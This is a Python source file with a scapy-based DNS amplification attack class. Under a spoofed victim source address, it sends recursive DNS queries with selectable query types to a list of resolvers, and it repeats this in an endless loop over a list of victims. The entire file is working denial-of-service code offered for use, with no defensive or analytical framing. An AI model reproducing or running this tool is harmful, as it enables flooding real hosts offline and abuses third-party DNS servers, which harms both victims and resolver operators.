import time

from scapy.all import *
from jsonschema import validate

class DNSAmplification:
    def __init__(self, config):
        self.ttl = 128
        self.request_timeout = 0
        self._load_config(config)
        pass

    def run(self):
        try:
            total_packages_sended = 0

            while True:
                for address in self.config["victim_list"]:
                    self.send_poison_package(address)
                
                total_packages_sended += (len(self.config["dns_addresses_list"]) * len(self.config["query_type_list"]))
                time.sleep(0.2)
        except KeyboardInterrupt:
            print("Stop attack, total packages sended: {}".format(total_packages_sended))
            exit()
        
        pass

    def send_poison_package(self, victim_ip):
        for dns_address in self.config["dns_addresses_list"]:
            for query_type in self.config["query_type_list"]:
                packet = IP(
                    src = victim_ip,
                    dst = dns_address,
                    ttl = self.ttl
                )/UDP()/DNS(
                    rd = 1,
                    qd = DNSQR(qname = self.config["query_name"], qtype = query_type)
                )

                try:
                    sr1(packet, verbose = False, timeout = self.request_timeout)
                except Exception, error:
                    print(error)

        pass

    def _load_config(self, config):
        config_schema = {
            "type" : "object",
            "properties" : {
                "query_name" : {"type" : "string"},
                "victim_list" : {"type" : "array"},
                "query_type_list" : {"type" : "array"},
                "dns_addresses_list" : {"type" : "array"},
            },
        }

        validate(instance = config, schema = config_schema)
        self.config = config
        pass
